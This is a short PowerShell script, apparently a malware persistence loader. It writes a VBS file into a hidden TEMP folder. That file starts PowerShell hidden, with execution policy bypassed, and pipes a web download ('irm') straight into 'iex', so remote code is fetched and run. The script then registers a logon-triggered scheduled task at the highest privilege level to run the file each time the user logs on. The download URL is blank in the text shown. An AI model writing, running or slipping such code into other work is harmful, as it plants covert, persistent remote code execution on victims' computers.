new-item -path "$env:TEMP\00" -force
@'
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ""irm "" | iex""", 0, False
'@ | Out-File -Encoding ASCII "$env:TEMP\00\68.vbs"
$Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$env:TEMP\00\68.vbs`""
$Trigger = New-ScheduledTaskTrigger -AtLogOn
$Principal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive -RunLevel Highest
$Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Principal $Principal
Register-ScheduledTask -TaskName "68" -InputObject $Task -Force | out-null
